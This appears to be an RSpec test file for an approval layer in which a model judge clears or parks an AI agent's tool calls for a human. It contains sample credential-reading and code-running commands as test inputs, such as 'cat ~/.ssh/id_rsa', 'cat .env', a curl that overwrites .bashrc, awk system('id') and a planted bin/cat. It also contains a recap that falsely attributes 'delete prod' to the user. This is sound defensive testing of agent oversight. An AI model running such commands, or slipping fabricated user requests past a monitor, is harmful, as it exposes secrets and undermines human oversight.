# frozen_string_literal: true

require "async"
require "fileutils"
require "stringio"
require "timeout"
require "tmpdir"

# Support kept out of the RSpec block (Lint/ConstantDefinitionInBlock).
module JudgedSpecSupport
  # A provider stand-in: records the question each request asks and answers
  # it with the text the injected block returns. A raise is a failed round trip.
  class ScriptedProvider
    attr_reader :prompts

    def initialize(&answer)
      @answer = answer
      @prompts = []
    end

    def complete(request, **)
      prompt = request.messages.sole.fetch("content")
      @prompts << prompt
      Lain::Response.new(content: [{ "type" => "text", "text" => @answer.call(prompt) }], stop_reason: :end_turn)
    end
  end

  def self.judge(provider, **)
    Lain::Approval::Judge.new(provider:, model: "judge-model", slots: Lain::Prompt::Slots.new(fills: {}), **)
  end

  # A context the way {Middleware::WithholdAutomaticOutput} hands one over: a
  # worker environment, a requester, and the bar on automatic approval.
  Context = Data.define(:worker_env, :requester, :automatic_approval_barred) do
    def automatic_approval_barred? = automatic_approval_barred
    def identity = Lain::Requester.of(requester)
  end
end

RSpec.describe Lain::Approval::Judged do
  let(:home) { "/home/tester" }
  let(:root) { "/home/tester/project" }
  let(:journal_io) { StringIO.new }
  let(:journal) { Lain::Journal.new(io: journal_io) }
  let(:queue) { Lain::Approval::Parked::Queue.new(journal:, timeout: 5) }
  let(:policy) do
    Lain::Sensitivity::Policy.new(sensitivity: Lain::Sensitivity.new(home:, cwd: root, root:), home:, root:)
  end
  let(:context) do
    JudgedSpecSupport::Context.new(worker_env: Lain::WorkerEnv.new(cwd: root, env: {}), requester: "main",
                                   automatic_approval_barred: false)
  end

  def answering(text = nil, &answer)
    JudgedSpecSupport::ScriptedProvider.new(&answer || ->(_) { text })
  end

  def rung(scripted, asking: Lain::Approval::Escalation::Surfaces.new(queue), timeout: 30, under: policy, **rest)
    described_class.new(judge: JudgedSpecSupport.judge(scripted, timeout:), policy: under, asking:,
                        journal:, **rest)
  end

  def call(name, input) = Lain::Effect::ToolCall.new(tool_use_id: "tu_#{name}", name:, input:)

  def bash(command = "make test", **rest) = call("bash", { "command" => command, **rest })

  def escalations = journal_records(journal_io, "escalation")

  # Runs the rung in a reactor; a parked call is answered by the human the
  # block plays, and an unparked one finishes on its own.
  def ruled(subject, effect, within: context, &human)
    Sync do |task|
      ruling = task.async { subject.call(effect, within) }
      human&.call(task.with_timeout(1) { queue.dequeue })
      ruling.wait
    end
  end

  # Denies whatever parks, and lets a call the judge settled finish unparked.
  def settled(subject, effect, within: context)
    Sync do |task|
      human = task.async { queue.dequeue.deny(surface: "human_spec") }
      subject.call(effect, within).tap { human.stop }
    end
  end

  it "names itself auto" do
    expect(rung(answering("approve")).name).to eq("auto")
  end

  it "applies a clear approve with automatic authority and parks nothing" do
    ruling = ruled(rung(answering("approve")), bash)

    expect([ruling.verdict, ruling.authority, ruling.rung]).to eq([:allow, :automatic, "auto"])
    expect(queue.to_a).to be_empty
  end

  it "applies a judge deny, not final" do
    ruling = ruled(rung(answering("deny")), bash)

    expect([ruling.verdict, ruling.final?]).to eq([:deny, false])
  end

  it "parks an unsure call for the human, journaling that the judge deferred" do
    ruling = ruled(rung(answering("defer")), bash) do |pending|
      pending.approve(surface: "human_spec", authority: :human)
    end

    expect([ruling.verdict, ruling.authority]).to eq(%i[allow human])
    expect(escalations.sole).to include("rung" => "auto", "verdict" => "abstain", "reason" => "deferred",
                                        "tool_use_id" => "tu_bash")
  end

  it "names the requester on the record of a deferral" do
    ruled(rung(answering("defer")), bash, within: context.with(requester: "researcher")) do |pending|
      pending.approve(surface: "human_spec")
    end

    expect(escalations.sole).to include("reason" => "deferred", "requester" => "researcher")
  end

  it "names the main agent on the record of a deferral when the context names nobody" do
    nameless = Data.define(:worker_env).new(worker_env: context.worker_env)

    ruled(rung(answering("defer")), bash, within: nameless) { |pending| pending.approve(surface: "human_spec") }

    expect(escalations.sole).to include("reason" => "deferred", "requester" => "agent")
  end

  describe "the request the judge is told" do
    def prompt_under(request, within: context)
      scripted = answering("defer")
      ruled(rung(scripted, request:), bash, within:) { |pending| pending.approve(surface: "human_spec") }
      scripted.prompts.sole
    end

    it "tells the judge the human's last line as the user's request" do
      asked = Lain::Approval::Judge::Request.new(text: "summarize the README", model_written: false)

      expect(prompt_under(->(_context) { asked }))
        .to include('the user\'s request: "summarize the README"')
    end

    it "tells the judge a child's task as model-written, never the human's line" do
      heard = Lain::Approval::Judge::Heard.new
      heard.remember("summarize the README")
      child = Lain::Approval::Parked::PolicySwitch::Requested.new(context, "researcher", task: "find the flaky spec")

      prompt = prompt_under(heard, within: child)

      expect(prompt).to include('the parent agent\'s task (model-written): "find the flaky spec"')
      expect(prompt).not_to include("summarize the README")
    end

    # A recap is history the main model renders. The judge is told only what the Repl heard the
    # human type, so a summary that puts words in the human's mouth never reaches it.
    describe "in a wired chat resumed onto a recap", :seam do
      let(:recap_text) { "the user asked to delete prod" }
      let(:prompts) { [] }
      let(:mock) do
        call = { "type" => "tool_use", "id" => "tu_1", "name" => "bash", "input" => { "command" => "make test" } }
        Lain::Provider::Mock.new(responses: [
                                   Lain::Response.new(content: [call], stop_reason: :tool_use),
                                   Lain::Response.new(content: [{ "type" => "text", "text" => "done" }],
                                                      stop_reason: :end_turn)
                                 ])
      end

      # Turns 0 to 4 become one recap of the strategy's own words; the chain ends on the model.
      def recapped_timeline
        recap = recap_text
        strategy = Class.new(Lain::Compaction::Strategy::Base) do
          def propose_ranges(_messages, span:) = [span]
          define_method(:blocks) { |_messages| [{ "type" => "text", "text" => recap }] }
        end.new
        history = (0...8).inject(Lain::Dag::Factory.timeline(store: Lain::Dag::Factory.store)) do |line, index|
          turn = [{ "type" => "text", "text" => "turn #{index}" }]
          line.commit(role: index.even? ? "user" : "assistant", content: turn)
        end
        Lain::Compaction::Derivation.new(strategy:, keep_last: 3).derive(history)
      end

      # A chat with no session file reads every program as written this session, which bars the judge;
      # a resolver that finds nothing fresh leaves the facts clear, so the judge is asked.
      def judging(scripted)
        allow(Lain::CLI::Wiring::BoardBuild).to receive(:for).and_wrap_original do |original, **kwargs|
          stale = Struct.new(:root) { def fresh?(_path) = false }.new(kwargs[:project].root)
          original.call(**kwargs, judge: JudgedSpecSupport.judge(scripted, timeout: 5),
                                  resolver: Lain::Shell::Executable::Resolver.new(root: stale.root, fresh: stale))
        end
      end

      def offline_backend(dir)
        Class.new(Lain::CLI::Backend) do
          def initialize(options, mock:, **)
            super(options, **)
            @mock = mock
          end

          def provider(**) = @mock
        end.new({ provider: "ollama", model: nil, max_tokens: 64 }, mock:, root: dir)
      end

      def resumed_onto_recap
        Lain::CLI::Resume::Result.new(file: "missing.ndjson", timeline: recapped_timeline, session: Lain::Session.new,
                                      open: false, notices: [],
                                      recorder: Lain::Memory::Recorder.new(index: Lain::Memory::Index.empty))
      end

      def wiring_typing(line, dir)
        terminal = lambda do |channel:, **|
          Lain::Frontend::TTY.new(channel:, output: StringIO.new, history_path: File.join(dir, "history"))
        end
        Lain::CLI::Wiring.new(
          options: { grace: 5, approval: "auto", judge_facts: "request", prompt: line, non_interactive: true },
          chronicle: Lain::CLI::Chronicle::Null.new, status_feed: instance_double(Lain::StatusFeed, bind_store: nil),
          project: throwaway_project(dir), stdin: StringIO.new, tty_factory: terminal,
          paths: Lain::Paths.new(env: { "XDG_STATE_HOME" => dir, "HOME" => dir })
        )
      end

      def run_typing(line, dir)
        wiring = wiring_typing(line, dir)
        Timeout.timeout(30) { wiring.run(backend: offline_backend(dir), resumed: resumed_onto_recap, nvim: nil) }
        wiring.conductor.close(reason: :exit)
      end

      it "tells the judge the line the human typed, never the recap the model was shown" do
        scripted = answering("deny")
        judging(scripted)

        Dir.mktmpdir("lain-judged-recap") { |dir| run_typing("list the files", File.realpath(dir)) }

        expect(Lain::Canonical.dump(mock.requests.first.messages)).to include(recap_text)
        expect(scripted.prompts.sole.lines.map(&:chomp)).to include('the user\'s request: "list the files"')
        expect(scripted.prompts.sole).not_to include("delete prod")
      end
    end

    it "tells the judge no request by default" do
      scripted = answering("defer")
      ruled(rung(scripted), bash) { |pending| pending.approve(surface: "human_spec") }

      expect(scripted.prompts.sole).not_to include("the user's request", "model-written")
    end
  end

  describe "what a human is shown of the judge" do
    let(:told) { [] }

    it "tells the display which call the judge approved" do
      ruled(rung(answering("approve"), display: told), bash("git log --oneline -5"))

      expect(told).to eq([Lain::Telemetry::JudgeRuled.new(call: 'bash({"command" => "git log --oneline -5"})',
                                                          verdict: "approved")])
    end

    it "tells the display which call the judge denied" do
      ruled(rung(answering("deny"), display: told), bash("ls -la /home/u"))

      expect(told).to eq([Lain::Telemetry::JudgeRuled.new(call: 'bash({"command" => "ls -la /home/u"})',
                                                          verdict: "denied")])
    end

    it "tells the model the judge refused the call and a human can still approve it" do
      ruling = ruled(rung(answering("deny")), bash("ls -la /home/u"))

      expect(ruling.said).to eq("the judge refused this call; that is a model's answer, not a human's, and a " \
                                "human can still approve it by switching approval to ask, so tell the user what " \
                                "you needed it for rather than re-sending it")
    end

    it "tells the parked row why the judge did not look at an opaque command" do
      ruled(rung(answering("approve")), bash("cd $D && cat notes.txt")) do |pending|
        expect(pending.notes).to eq(["the judge did not look: its paths cannot be named"])
        pending.deny(surface: "human_spec")
      end

      expect(escalations.sole).to include("reason" => "unjudgeable",
                                          "note" => "the judge did not look: its paths cannot be named")
    end

    it "tells the parked row why the judge did not look at a path it may not weigh" do
      ruled(rung(answering("approve")), call("read_file", { "path" => ".env" })) do |pending|
        expect(pending.notes).to eq(["the judge did not look: .env is not a path it may weigh"])
        pending.deny(surface: "human_spec")
      end
    end

    it "tells the parked row why the judge did not look at a call barred from automatic approval" do
      ruled(rung(answering("approve")), bash, within: context.with(automatic_approval_barred: true)) do |pending|
        expect(pending.notes).to eq(["the judge did not look: this command is barred from automatic approval"])
        pending.deny(surface: "human_spec")
      end
    end

    it "marks the parked call as one the judge deferred" do
      ruled(rung(answering("defer")), bash) do |pending|
        expect(pending.reasons.map(&:to_s)).to eq([described_class::DEFERRAL_NOTE])
        pending.approve(surface: "human_spec")
      end
    end

    it "keeps the requester and directory of the call it marks" do
      ruled(rung(answering("defer")), bash) do |pending|
        expect([pending.requester, pending.cwd]).to eq(["main", root])
        pending.approve(surface: "human_spec")
      end
    end

    it "does not mark a call the judge faulted on" do
      ruled(rung(answering { raise(IOError, "approve") }), bash) do |pending|
        expect(pending.reasons.map(&:own?)).not_to include(true)
        pending.deny(surface: "human_spec")
      end
    end

    it "does not mark a call it never judged" do
      ruled(rung(answering("approve")), bash("cat ~/.ssh/id_rsa")) do |pending|
        expect(pending.reasons.map(&:own?)).not_to include(true)
        pending.deny(surface: "human_spec")
      end
    end

    it "does not mark a call parked with no judge at all" do
      parked = Sync do |task|
        task.async { queue.adjudicate(bash, context) }
        task.with_timeout(1) { queue.dequeue }.tap { _1.deny(surface: "human_spec") }
      end

      expect(parked.reasons.map(&:own?)).not_to include(true)
    end
  end

  it "parks after the bound when the judge hangs, journaling a fault" do
    hung = answering { sleep 5 }

    outcome = ruled(rung(hung, timeout: 0.05), bash) { |pending| pending.deny(surface: "human_spec") }

    expect([outcome.decision.verdict, outcome.by]).to eq([:deny, "surfaces"])
    expect(escalations.sole).to include("rung" => "auto", "verdict" => "abstain", "reason" => "fault",
                                        "faulted" => true)
  end

  # The fault travels beside the asking rung's answer, so that answer is the
  # surface's own and the ladder's edge decides what a fault suppresses.
  it "hands a judge fault up in the outcome, leaving the asking rung's ruling as it was" do
    scripted = answering { raise IOError, "provider down" }

    outcome = ruled(rung(scripted), bash) { |pending| pending.approve(surface: "tty", authority: :human) }

    expect(outcome).to be_a(Lain::Approval::Ladder::Outcome)
    expect([outcome.decision.verdict, outcome.decision.fault?, outcome.faults.map(&:rung)])
      .to eq([:allow, false, ["auto"]])
  end

  it "tells the parked row the judge could not be asked, without the exception text" do
    hung = answering { sleep 5 }

    ruled(rung(hung, timeout: 0.05), bash) do |pending|
      expect(pending.notes).to eq(["the judge could not be asked (it timed out or failed)"])
      pending.deny(surface: "human_spec")
    end

    expect(escalations.sole["note"]).to be_nil
  end

  it "parks a failed round trip as a fault" do
    scripted = answering { raise(IOError, "approve") }

    ruled(rung(scripted), bash) { |pending| pending.deny(surface: "human_spec") }

    expect(escalations.sole).to include("reason" => "fault", "faulted" => true)
  end

  it "journals what made the judge fault" do
    scripted = answering { raise IOError, "provider down" }

    ruled(rung(scripted), bash) { |pending| pending.deny(surface: "human_spec") }

    expect(escalations.sole).to include("reason" => "fault", "error" => "IOError: provider down")
  end

  it "journals a failed round trip's message as what made the judge fault" do
    scripted = answering { raise(IOError, "cannot restrict to absent tools: grep") }

    ruled(rung(scripted), bash) { |pending| pending.deny(surface: "human_spec") }

    expect(escalations.sole["error"]).to include("cannot restrict to absent tools: grep")
  end

  it "does not let an automatic surface's allow stand over a judge fault" do
    ladder = Lain::Approval::Escalation.new([rung(answering { raise IOError, "down" })], journal:)

    ruling = Sync do |task|
      settled = task.async { ladder.rule(bash, context) }
      task.with_timeout(1) { queue.dequeue }.approve(surface: Lain::Approval::Parked::SecretSurface::SURFACE)
      settled.wait
    end

    expect(ruling.verdict).to eq(:deny)
  end

  it "hands the judge the requester the context names" do
    scripted = answering("approve")

    ruled(rung(scripted), bash, within: context.with(requester: "researcher-7"))

    expect(scripted.prompts.sole).to include("researcher-7")
  end

  describe "what the judge is told about where the call runs" do
    def prompt_for(effect, within: context)
      scripted = answering("approve")
      ruled(rung(scripted), effect, within:)
      scripted.prompts.sole.lines.map(&:strip)
    end

    it "names the read roots of the requester's own bounds" do
      bounds = Lain::Sensitivity::Bounds.of(reads: ["/state/epics/demo"], writes: ["/state/leases/r1"])
      bounded = context.with(worker_env: Lain::WorkerEnv.new(cwd: "/state/leases/r1", env: {}, bounds:))

      expect(prompt_for(bash("ls"), within: bounded))
        .to include('read roots: "/state/epics/demo", "/state/leases/r1"')
    end

    it "names each path the call names with how lain classified it" do
      readme = "#{root}/README.md"

      expect(prompt_for(bash("cat #{readme}"))).to include("named paths: #{readme.inspect} (ordinary)")
    end

    it "names a leased child's own tree as the project root, the human's checkout, and the requester" do
      lease = Lain::WorkerEnv.new(cwd: "/state/leases/r1", env: {}, checkout: "/state/leases/r1")
      leased = context.with(worker_env: lease, requester: "researcher")

      expect(prompt_for(bash("ls"), within: leased))
        .to include("project root: \"/state/leases/r1\"", "the human's checkout: #{root.inspect}",
                    "working directory: \"/state/leases/r1\"", "requester: \"researcher\"")
    end

    context "when a leased child reaches the human's checkout" do
      let(:leased) do
        lease = Lain::WorkerEnv.new(cwd: "/state/leases/r1", env: {}, checkout: "/state/leases/r1")
        context.with(worker_env: lease, requester: "researcher")
      end

      it "does not show a read of it as outside" do
        expect(prompt_for(bash("cat #{root}/README.md"), within: leased)).to include("outside the project root: none")
      end

      it "shows a write to it as outside" do
        expect(prompt_for(call("write_file", { "path" => "#{root}/notes.md", "content" => "x" }), within: leased))
          .to include("outside the project root: #{"#{root}/notes.md".inspect}")
      end

      it "shows a path-taking tool it does not know as writing there, so it fails closed" do
        stub_const("Lain::Sensitivity::Policy::PATH_FIELDS",
                   Lain::Sensitivity::Policy::PATH_FIELDS.merge("stamp_file" => "path"))

        expect(prompt_for(call("stamp_file", { "path" => "#{root}/notes.md" }), within: leased))
          .to include("outside the project root: #{"#{root}/notes.md".inspect}")
      end

      it "shows a command's write to it as outside" do
        expect(prompt_for(bash("echo x > #{root}/notes.md"), within: leased))
          .to include("outside the project root: #{"#{root}/notes.md".inspect}")
      end
    end

    context "when the session lends a read root" do
      let(:epics) { "/home/tester/.local/state/lain/epics/abc" }
      let(:policy) do
        Lain::Sensitivity::Policy.new(sensitivity: Lain::Sensitivity.new(home:, cwd: root, root:), home:, root:,
                                      read_roots: [epics])
      end

      it "does not show a read there as outside" do
        expect(prompt_for(bash("grep -rn TODO #{epics}/demo"))).to include("outside the project root: none")
      end

      it "shows a write there as outside" do
        expect(prompt_for(bash("echo x > #{epics}/demo/epic.md")))
          .to include("outside the project root: #{"#{epics}/demo/epic.md".inspect}")
      end
    end

    it "names the main agent's plan-scope spike as the project root, and the human's checkout" do
      spike = Lain::WorkerEnv.new(cwd: "/state/spikes/s1", env: {}, checkout: "/state/spikes/s1")

      expect(prompt_for(bash("ls"), within: context.with(worker_env: spike, requester: "agent")))
        .to include("requester: \"agent\"", "project root: \"/state/spikes/s1\"",
                    "the human's checkout: #{root.inspect}")
    end

    it "names no human's checkout for the main agent" do
      expect(prompt_for(bash("ls")).grep(/checkout/)).to be_empty
    end

    it "lists no guessed fragment of an unknown program's flag as outside" do
      expect(prompt_for(bash("frob -name foo", "cwd" => "#{home}/other")))
        .to include("outside the project root: #{"#{home}/other".inspect}, #{"#{home}/other/foo".inspect}")
    end

    it "keeps an unknown program's guessed absolute value as outside" do
      expect(prompt_for(bash("frob -o/etc/hosts"))).to include("outside the project root: \"/etc/hosts\"")
    end

    it "lists no flag fragment of find as outside" do
      expect(prompt_for(bash("find . -name foo", "cwd" => "#{home}/other")))
        .to include("outside the project root: #{"#{home}/other".inspect}, #{"#{home}/other/foo".inspect}")
    end

    it "shows a path under the home but outside the project as outside" do
      expect(prompt_for(bash("ls ~/.cargo/registry")))
        .to include("outside the project root: #{"#{home}/.cargo/registry".inspect}")
    end

    it "shows the walk root of a glob with an absolute pattern as outside" do
      expect(prompt_for(call("glob", { "pattern" => "/tmp/x/**/*.rs" })))
        .to include("outside the project root: \"/tmp/x\"")
    end

    it "shows a path in the requester's own checkout as not outside" do
      lease = Lain::WorkerEnv.new(cwd: "/state/leases/r1", env: {}, checkout: "/state/leases/r1")
      leased = context.with(worker_env: lease, requester: "researcher")

      expect(prompt_for(bash("ls src"), within: leased)).to include("outside the project root: none")
    end

    it "shows a path in a related directory as not outside" do
      related = Lain::Sensitivity::Rules.new(related: ["#{home}/notes"])
      under = Lain::Sensitivity::Policy.new(sensitivity: Lain::Sensitivity.new(home:, cwd: root, root:, rules: related),
                                            home:, root:)
      scripted = answering("approve")

      settled(rung(scripted, under:), bash("ls ~/notes"))

      expect(scripted.prompts.sole).to include("outside the project root: none")
    end

    it "shows the project root itself as not outside when the root is spelled with a trailing slash" do
      slashed = Lain::Sensitivity::Policy.new(sensitivity: Lain::Sensitivity.new(home:, cwd: root, root: "#{root}/"),
                                              home:, root: "#{root}/")
      scripted = answering("approve")

      settled(rung(scripted, under: slashed), bash("ls #{root}"))

      expect(scripted.prompts.sole).to include("outside the project root: none")
    end

    it "shows a path inside the project as not outside" do
      expect(prompt_for(bash("ls src"))).to include("outside the project root: none")
    end

    context "when a link inside the project leads out of it" do
      around do |example|
        Dir.mktmpdir("lain-judged-link") do |dir|
          @base = File.realpath(dir)
          example.run
        end
      end

      let(:home) { File.join(@base, "home") }
      let(:root) { File.join(home, "project") }

      it "shows a write through it as outside, where it lands" do
        FileUtils.mkdir_p([root, File.join(@base, "elsewhere")])
        File.symlink(File.join(@base, "elsewhere"), File.join(root, "out"))

        expect(prompt_for(call("write_file", { "path" => "out/a.rb", "content" => "x" })))
          .to include("outside the project root: #{"#{root}/out/a.rb".inspect}")
      end
    end
  end

  describe "the facts the judge is told" do
    let(:asked) { [] }
    let(:facts) do
      stage = Lain::Shell::Executable.new(name: "make", resolved: "/usr/bin/make", realpath: "/usr/bin/make",
                                          chain: ["/usr/bin/make"], shadowed: [], anomalies: [], klass: :system,
                                          fresh: false, run_files: [], wrappers: [])
      told = Lain::Approval::Judge::Facts.new([stage])
      ->(command, cwd, tool_use_id:) { asked.push([command, cwd, tool_use_id]) && told }
    end

    def prompt_under(effect, **rest)
      scripted = answering("approve")
      ruled(rung(scripted, **rest), effect)
      scripted.prompts.sole
    end

    it "asks for a bash call's facts at the directory it runs in, and tells the judge them" do
      prompt = prompt_under(bash("make test", "cwd" => "lib"), facts:)

      expect(asked).to eq([["make test", File.join(root, "lib"), "tu_bash"]])
      expect(prompt.lines.map(&:chomp)).to include("facts (computed by lain, not by the model):",
                                                   "make -> /usr/bin/make [system]")
    end

    it "asks none for a call that runs no command" do
      prompt = prompt_under(call("read_file", { "path" => File.join(root, "README.md") }), facts:)

      expect([asked, prompt]).to match([[], satisfy { |text| !text.include?("facts (computed") }])
    end

    it "asks none for a call that is not bash, though its input names a command" do
      prompt = prompt_under(call("run", { "command" => "make test" }), facts:)

      expect([asked, prompt]).to match([[], satisfy { |text| !text.include?("facts (computed") }])
    end

    it "tells the judge no facts by default" do
      expect(prompt_under(bash)).not_to include("facts (computed")
    end
  end

  describe "the structured bar, decided before the judge is asked" do
    let(:asked_human) { StringIO.new }

    def stage(klass, fresh: false, anomalies: [], run_files: [])
      path = klass == :unresolved ? nil : "/somewhere/#{klass}/bin/make"
      Lain::Shell::Executable.new(name: "make", resolved: path, realpath: path, chain: [], shadowed: [], anomalies:,
                                  klass:, fresh:, run_files:, wrappers: [])
    end

    def told(*stages)
      facts = Lain::Approval::Judge::Facts.new(stages)
      ->(_command, _cwd, **) { facts }
    end

    def answered(verdict, *stages)
      settled(rung(answering(verdict), facts: told(*stages)), bash)
    end

    def makefile(fresh: false)
      Lain::Shell::Executable::RunFiles::Entry.new(path: "/p/Makefile", klass: :project, fresh:)
    end

    it "lets an approve stand for a call whose every stage is system, user or unchanged project" do
      rulings = [[stage(:system), stage(:system)], [stage(:user)], [stage(:project, run_files: [makefile])]]
                .map { answered("approve", *_1) }

      expect(rulings.map { [_1.verdict, _1.authority, _1.rung] }).to all(eq([:allow, :automatic, "auto"]))
      expect(queue.to_a).to be_empty
    end

    def parked(*stages, within: context)
      pending = nil
      scripted = answering("approve")
      ruling = ruled(rung(scripted, facts: told(*stages)), bash, within:) do |parked|
        pending = parked
        Lain::Frontend::ApprovalPolicy.new(output: asked_human, input: StringIO.new("n\n")).decide(parked)
      end
      expect(scripted.prompts).to be_empty
      [ruling, pending]
    end

    it "hands a call the bar forbids to the human without asking the judge, journaling each stage's reason" do
      barred = {
        [stage(:project, fresh: true)] => "make -> /somewhere/project/bin/make: written this session",
        [stage(:system, run_files: [makefile(fresh: true)])] => "make runs /p/Makefile: written this session",
        [stage(:system), stage(:unresolved)] => "make: not resolved",
        [stage(:system, anomalies: [:project_path_entry])] => "PATH has an entry inside the project"
      }

      rulings = barred.keys.map { parked(*_1).first }

      expect(rulings.map { [_1.verdict, _1.rung] }).to all(eq([:deny, "surfaces"]))
      expect(escalations.map { _1.slice("rung", "verdict", "reason", "bar") })
        .to eq(barred.values.map { { "rung" => "auto", "verdict" => "abstain", "reason" => "bar", "bar" => [_1] } })
    end

    it "tells the human what lain's bar stopped, never that the judge deferred" do
      ruling, pending = parked(stage(:project, fresh: true), stage(:system, anomalies: [:relative_path_entry]))

      expect([ruling.verdict, pending.reasons.map(&:own?).include?(true)]).to eq([:deny, false])
      expect(pending.notes).to eq([described_class::RESOLVED_BAR,
                                   "make -> /somewhere/project/bin/make: written this session",
                                   "PATH has a relative entry"])
      expect(asked_human.string)
        .to include("; \"what lain resolved the command to bars an automatic approval, so the judge was not " \
                    "asked\"; \"make -> /somewhere/project/bin/make: written this session\"; " \
                    "\"PATH has a relative entry\"")
        .and(satisfy { |text| !text.include?("the judge deferred") })
    end

    it "keeps what a rung above it noted ahead of what the bar found" do
      noted = Lain::Approval::Escalation::Noted.new(context, "a rung above noted this")

      _, pending = parked(stage(:unresolved), within: noted)

      expect(pending.notes).to eq(["a rung above noted this", described_class::RESOLVED_BAR, "make: not resolved"])
    end

    it "hands a planted cat down unasked, through the session's real resolver" do
      Dir.mktmpdir("lain-judged-bar") do |dir|
        project = File.realpath(dir)
        FileUtils.mkdir_p(File.join(project, "bin"))
        File.write(File.join(project, "bin", "cat"), "#!/bin/sh\n")
        File.chmod(0o755, File.join(project, "bin", "cat"))
        fresh = Struct.new(:root) { def fresh?(path) = path.start_with?("#{root}/bin/") }.new(project)
        stages = Lain::CLI::Wiring::BoardBuild::Classifiers.new(
          home: File.join(project, "home"), cwd: project, root: project,
          resolver: Lain::Shell::Executable::Resolver.new(root: project, fresh:, host_env: {}),
          worker_env: Lain::WorkerEnv.new(cwd: project, env: { "PATH" => "/usr/bin" })
        )
        facts = Lain::Approval::Judge::Facts::Resolving.new(verdict: Lain::Shell::Verdict.new, stages:)
        effect = bash("./bin/cat README.md", "cwd" => project)

        ruling = settled(rung(answering("approve"), facts:), effect)

        expect([ruling.verdict, ruling.rung]).to eq([:deny, "surfaces"])
        expect(escalations.sole).to include("rung" => "auto", "verdict" => "abstain", "reason" => "bar",
                                            "bar" => ["./bin/cat -> #{project}/bin/cat: written this session"])
      end
    end
  end

  describe "tier 0" do
    it "never asks the judge about a read on a credential-named path, and parks it" do
      scripted = answering("approve")

      ruling = ruled(rung(scripted), call("read_file", { "path" => ".env" })) do |pending|
        pending.deny(surface: "human_spec")
      end

      expect(scripted.prompts).to be_empty
      expect(ruling.rung).to eq("surfaces")
      expect(escalations.sole).to include("rung" => "auto", "verdict" => "abstain", "reason" => "unjudgeable",
                                          "tool" => "read_file")
    end

    it "never asks the judge about a write on a protected path or a command run in a named secret directory" do
      scripted = answering("approve")
      effects = [call("write_file", { "path" => ".lain/config.rb", "content" => "x" }), bash("ls", "cwd" => "secrets")]

      parked = effects.map do |effect|
        tool = nil
        ruled(rung(scripted), effect) do |pending|
          tool = pending.tool.to_s
          pending.deny(surface: "human_spec")
        end
        tool
      end

      expect(scripted.prompts).to be_empty
      expect(parked).to eq(%w[write_file bash])
      expect(escalations.map { _1["reason"] }).to eq(%w[unjudgeable unjudgeable])
    end

    describe "a bash command" do
      def parked_unjudged(command, under: policy, **rest)
        scripted = answering("approve")
        ruling = ruled(rung(scripted, under:), bash(command, **rest)) { |pending| pending.deny(surface: "human_spec") }
        [ruling.rung, scripted.prompts.size, escalations.last&.slice("rung", "reason", "tool")]
      end

      def judged?(command, under: policy)
        scripted = answering("approve")
        settled(rung(scripted, under:), bash(command))
        scripted.prompts.size == 1
      end

      it "never asks the judge about a read of a credential, and parks it" do
        expect(parked_unjudged("cat .env"))
          .to eq(["surfaces", 0, { "rung" => "auto", "reason" => "unjudgeable", "tool" => "bash" }])
      end

      it "never asks the judge about a read of a Rails master key, a vault password file or a local env file" do
        commands = ["cat config/master.key", "cat .vault_pass", "cat .vault-password", "cat .env.local"]

        expect(commands.to_h { [_1, judged?(_1)] }).to eq(commands.to_h { [_1, false] })
      end

      it "never asks the judge about a named secret the user's request asked for" do
        scripted = answering("approve")
        asked = Lain::Approval::Judge::Request.new(text: "print .env", model_written: false)
        settled(rung(scripted, request: ->(_context) { asked }), bash("cat .env"))

        expect(scripted.prompts).to be_empty
      end

      it "never asks the judge about a command whose paths it cannot name" do
        expect(parked_unjudged('cat "$X"').take(2)).to eq(["surfaces", 0])
      end

      it "never asks the judge about a cd into a credential directory" do
        expect(parked_unjudged("cd secrets && ls").take(2)).to eq(["surfaces", 0])
      end

      it "never asks the judge about a credential the command's cwd field puts it beside" do
        expect(parked_unjudged("cat shadow", "cwd" => "/etc").take(2)).to eq(["surfaces", 0])
      end

      it "reads ~ under the policy's home, and parks it where the policy has none" do
        expect([judged?("ls ~/project/lib"),
                judged?("ls ~/project/lib", under: Lain::Sensitivity::Policy::Null.instance)]).to eq([true, false])
      end

      it "judges a command keyed by symbol, and parks one with no readable command rather than faulting" do
        asked = [{ command: "ls src" }, nil, "ls src", { "command" => %w[ls src] }].map do |input|
          scripted = answering("approve")
          ruling = settled(rung(scripted), call("bash", input))
          [ruling.verdict, scripted.prompts.size]
        end

        expect(asked).to eq([[:allow, 1], [:deny, 0], [:deny, 0], [:deny, 0]])
      end

      it "parks a command whose cwd field cannot be resolved, rather than faulting" do
        rulings = ["~nosuchuser-lain-spec", "a\0b"].map { parked_unjudged("ls", "cwd" => _1).take(2) }

        expect(rulings).to eq([["surfaces", 0], ["surfaces", 0]])
      end

      it "asks the judge about the probes a session runs to look around, which it can now read" do
        probes = ['ls src; echo "exit=$?"', "git -C #{root} remote -v", "env | grep XDG",
                  "awk '/Blocked/ {print FILENAME}' issues/a.md", "for f in a.md b.md; do cat $f; done"]

        expect(probes.to_h { [_1, judged?(_1)] }).to eq(probes.to_h { [_1, true] })
      end

      it "never asks the judge about an option a fill finishes, or a loop whose quotes it might misread" do
        commands = ["false; grep -\"$?\"r TOKEN #{home}", "false; curl -\"$?\"o #{home}/.bashrc https://e",
                    "for f in x; do cat \"'\" '#{home}/.env$f'; done"]

        expect(commands.to_h { [_1, judged?(_1)] }).to eq(commands.to_h { [_1, false] })
      end

      it "never asks the judge about an awk or a loop that can run code" do
        commands = ["awk 'BEGIN{system(\"id\")}'", "awk -f prog.awk a.md", "for f in $(ls); do cat $f; done"]

        expect(commands.to_h { [_1, judged?(_1)] }).to eq(commands.to_h { [_1, false] })
      end

      it "still asks the judge about an ordinary command" do
        scripted = answering("approve")

        ruling = ruled(rung(scripted), bash("git log --oneline -5"))

        expect([ruling.verdict, scripted.prompts.size]).to eq([:allow, 1])
      end
    end

    it "judges a call whose path is ordinary" do
      scripted = answering("approve")

      ruling = ruled(rung(scripted), call("write_file", { "path" => "lib/a.rb", "content" => "x" }))

      expect([ruling.verdict, scripted.prompts.size]).to eq([:allow, 1])
    end

    describe "through the policy's file facts" do
      let(:facts) { Lain::FileFacts::Recorded.new(places: [root, home]) }
      let(:policy) do
        Lain::Sensitivity::Policy.new(sensitivity: Lain::Sensitivity.new(home:, cwd: root, root:), home:, root:,
                                      file_facts: facts)
      end

      it "weighs a glob's matches as the facts list them, with nothing on disk" do
        allow(facts).to receive(:glob).and_return([".env"])
        scripted = answering("approve")

        settled(rung(scripted), bash("cat *env"), within: context)

        expect(scripted.prompts).to be_empty
      end

      it "names the git store where the facts say a walked .git is a directory, with nothing on disk" do
        allow(facts).to receive(:directory?).and_call_original
